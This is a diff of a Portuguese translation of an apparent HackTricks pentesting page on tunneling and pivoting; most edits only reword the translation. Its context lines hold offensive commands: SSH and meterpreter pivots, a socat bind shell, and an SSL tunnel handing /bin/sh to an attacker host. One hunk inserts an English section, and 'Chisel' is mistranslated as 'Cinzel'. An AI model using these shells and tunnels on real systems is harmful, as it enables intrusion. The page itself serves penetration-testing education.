@@ -4,7 +4,7 @@
 
 <summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
@@ -14,7 +14,7 @@
 
 **Grupo de Segurança Try Hard**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -52,7 +52,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Porta Local para Porta
 
-Abrir uma nova porta no Servidor SSH --> Outra porta
+Abrir nova porta no servidor SSH --> Outra porta
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -70,7 +70,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Porta Local --> Host Comprometido (SSH) --> Para onde quer que seja
+Porta Local --> Host Comprometido (SSH) --> Qualquer lugar
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -87,7 +87,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-É necessário **root em ambos os dispositivos** (pois você vai criar novas interfaces) e a configuração do sshd deve permitir login de root:\
+Você precisa de **root em ambos os dispositivos** (pois você vai criar novas interfaces) e a configuração do sshd deve permitir login como root:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -123,14 +123,14 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Porta local --> Host comprometido (sessão ativa) --> Terceira\_caixa:Porta
+Porta local --> Host comprometido (sessão ativa) --> Terceiro\_host:Porta
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-SOCKS (Socket Secure) é um protocolo de rede que permite a comunicação de pacotes entre clientes e servidores através de um servidor proxy. Ele pode ser usado para rotear o tráfego da rede de forma segura e anônima, facilitando a criação de túneis para acessar recursos de rede internos de forma remota.
+SOCKS (Socket Secure) é um protocolo de rede que permite a comunicação de pacotes entre redes através de um servidor intermediário. Ele pode ser usado para rotear o tráfego da rede de um cliente através do servidor SOCKS, fornecendo anonimato e contornando restrições de rede.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -138,7 +138,19 @@ use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-Outra maneira:
+### Tunneling and Port Forwarding
+
+Tunneling is a method that allows data to be transferred securely over an insecure network. It involves encapsulating the data into another protocol to create a secure communication channel. Port forwarding, on the other hand, is a technique that redirects a communication request from one address and port number combination to another. This can be useful for accessing services on a remote network securely.
+
+#### Tunneling
+
+Tunneling can be achieved using various protocols such as SSH, VPN, or even HTTP. It is commonly used to bypass firewalls, access restricted content, or secure communication between two endpoints. By creating a tunnel, data is encrypted and can traverse the insecure network without being intercepted.
+
+#### Port Forwarding
+
+Port forwarding is often used in conjunction with tunneling to redirect specific network traffic. It can be set up using tools like SSH or specialized software. By forwarding ports, services running on specific ports on a remote machine can be accessed securely from a local machine. This is particularly useful for remote administration or accessing services on a server behind a firewall.
+
+Both tunneling and port forwarding are essential techniques in the field of cybersecurity and can be used for various purposes, including penetration testing, bypassing restrictions, and securely accessing remote resources.
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -166,7 +178,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-Neste caso, a **porta é aberta no host de beacon**, não no Servidor da Equipe e o tráfego é enviado para o Servidor da Equipe e a partir daí para o host:porta indicado.
+Neste caso, a **porta é aberta no host beacon**, não no Servidor da Equipe e o tráfego é enviado para o Servidor da Equipe e a partir daí para o host:porta indicado.
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -195,9 +207,9 @@ Você precisa fazer upload de um arquivo de túnel da web: ashx|aspx|js|jsp|php|
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
-## Chisel
+## Cinzel
 
-Você pode baixá-lo na página de lançamentos do [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+Você pode baixá-lo na página de lançamentos de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
 Você precisa usar a **mesma versão para cliente e servidor**
 
 ### socks
@@ -239,7 +251,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Conexão de Bind
+### Shell de Ligação
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
@@ -275,7 +287,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 ### Túnel SSL com Socat
 
-**/bin/sh console**
+**Console /bin/sh**
 
 Criar certificados em ambos os lados: Cliente e Servidor
 ```bash
@@ -291,9 +303,9 @@ chmod 600 $FILENAME.key $FILENAME.pem
 attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
 victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
 ```
-### Porta2Porta Remoto
+### Porta Remota para Porta
 
-Conecte a porta SSH local (22) à porta 443 do host do atacante
+Conecte a porta SSH local (22) à porta 443 do host atacante
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -301,7 +313,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-É como uma versão de console do PuTTY (as opções são muito semelhantes a um cliente ssh).
+É como uma versão console do PuTTY (as opções são muito semelhantes a um cliente ssh).
 
 Como este binário será executado na vítima e é um cliente ssh, precisamos abrir nosso serviço ssh e porta para que possamos ter uma conexão reversa. Em seguida, para encaminhar apenas a porta acessível localmente para uma porta em nossa máquina:
 ```bash
@@ -325,7 +337,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ## SocksOverRDP & Proxifier
 
 É necessário ter **acesso RDP sobre o sistema**.\
-Baixe:
+Download:
 
 1. [Binários SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta utiliza `Dynamic Virtual Channels` (`DVC`) do recurso de Serviço de Área de Trabalho Remota do Windows. O DVC é responsável por **tunelar pacotes sobre a conexão RDP**.
 2. [Binário Portátil do Proxifier](https://www.proxifier.com/download/#win-tab)
@@ -351,7 +363,7 @@ Agora você pode usar [**Proxifier**](https://www.proxifier.com/) **para encamin
 
 Você pode fazer com que aplicativos GUI do Windows naveguem por um proxy usando [**Proxifier**](https://www.proxifier.com/).\
 Em **Profile -> Proxy Servers** adicione o IP e a porta do servidor SOCKS.\
-Em **Profile -> Proxification Rules** adicione o nome do programa para proxificar e as conexões para os IPs que deseja proxificar.
+Em **Profile -> Proxification Rules** adicione o nome do programa a ser proxificado e as conexões para os IPs que deseja proxificar.
 
 ## Bypass de proxy NTLM
 
@@ -365,7 +377,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
 Autentica-se contra um proxy e vincula uma porta local que é encaminhada para o serviço externo que você especificar. Em seguida, você pode usar a ferramenta de sua escolha por meio desta porta.\
-Por exemplo, encaminhar a porta 443.
+Por exemplo, encaminha a porta 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -373,8 +385,8 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Agora, se você definir, por exemplo, na vítima o serviço **SSH** para ouvir na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
-Você também poderia usar um **meterpreter** que se conecta a localhost:443 e o atacante está ouvindo na porta 2222.
+Agora, se você configurar, por exemplo, no alvo o serviço **SSH** para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
+Você também poderia usar um **meterpreter** que se conecta a localhost:443 e o atacante está escutando na porta 2222.
 
 ## YARP
 
@@ -528,7 +540,7 @@ addr: file:///tmp/httpbin/
 
 **Grupo de Segurança Try Hard**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -540,7 +552,7 @@ addr: file:///tmp/httpbin/
 
 * Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
